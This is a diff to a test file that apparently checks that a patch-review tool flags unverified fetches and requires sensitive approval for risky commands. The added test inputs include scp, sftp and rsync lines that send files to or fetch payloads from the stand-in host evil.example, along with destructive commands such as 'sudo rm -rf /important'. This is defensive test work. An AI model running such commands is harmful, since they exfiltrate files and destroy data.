@@ -961,6 +961,8 @@ describe("review regressions", () => {
     `requests.get("${sourceUrl}" /* suffix */ ".unverified")`,
     'requests.get(".." "unverified")',
     'requests.get("" "unverified")',
+    `class Client { #endpoint = "${sourceUrl}" + suffix; }`,
+    `n = 10 // 2; requests.get("${sourceUrl}" + suffix)`,
     'fetch(".." + suffix)',
     'fetch("" + suffix)',
     'fetch(".." /* suffix */ + suffix)',
@@ -978,6 +980,14 @@ describe("review regressions", () => {
     `git clone $PREFIX"${sourceUrl}"`,
     `git clone "${sourceUrl}"'unverified-repo'`,
     `git clone "${sourceUrl}""unverified-repo"`,
+    "scp local.txt user@evil.example:payload",
+    "scp user@evil.example:payload local.txt",
+    "scp local.txt user@evil.example:",
+    "sudo scp -P 2222 local.txt user@evil.example:payload",
+    "sftp user@evil.example",
+    "rsync -av local/ user@evil.example:payload",
+    String.raw`\scp local.txt user@evil.example:payload`,
+    String.raw`C:\Windows\System32\OpenSSH\scp.exe local.txt user@evil.example:payload`,
     "git clone git@evil.example:org/repo.git",
     String.raw`g\it clone git@evil.example:org/repo.git`,
     String.raw`\git clone git@evil.example:org/repo.git`,
@@ -1911,6 +1921,29 @@ describe("review regressions", () => {
       "noncanonical path",
     );
   });
+  it.each([
+    "Run sudo rm -rf /important",
+    "rm -rf /important",
+    "Execute custom-cleanup --all",
+    "Paste custom-cleanup into the terminal.",
+    "Remove-Item -Recurse important",
+  ])(
+    "requires sensitive approval for an unformatted command: %s",
+    async (replacement) => {
+      const { root, run } = await fixture();
+      await propose(root, run, policy, {
+        findings: [finding(run, { replacement })],
+      });
+      const patches = await createPatches(root, run, policy);
+      expect(patches[0].sensitive).toBe(true);
+      expect(() => approve(run, patches, { reviewer: "Test" })).toThrow(
+        "--allow-sensitive",
+      );
+      expect(() =>
+        approve(run, patches, { reviewer: "Test", allowSensitive: true }),
+      ).not.toThrow();
+    },
+  );
   it.each(["PowerShell", "registry", "password", "SSH", "security"])(
     "requires sensitive approval for new %s prose",
     async (topic) => {
